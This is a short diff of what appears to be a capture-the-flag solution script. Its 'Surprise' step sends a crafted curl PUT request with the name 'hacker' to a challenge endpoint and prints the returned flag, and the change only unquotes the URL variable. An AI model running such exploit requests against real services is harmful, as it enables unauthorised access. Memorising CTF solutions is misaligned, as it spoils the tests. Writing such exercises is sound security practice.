@@ -14,6 +14,6 @@ fi
 # Surprise
 echo "Start exploit for Suprise"
 remote=$remote'/surprise/'
-flag=$(curl -s --request PUT --header "Content-Type: application/json" --data '{"name":"hacker"}' "$remote" | tail -n 1)
+flag=$(curl -s --request PUT --header "Content-Type: application/json" --data '{"name":"hacker"}' $remote | tail -n 1)
 echo "Flag is $flag"
 echo "-------------------------"
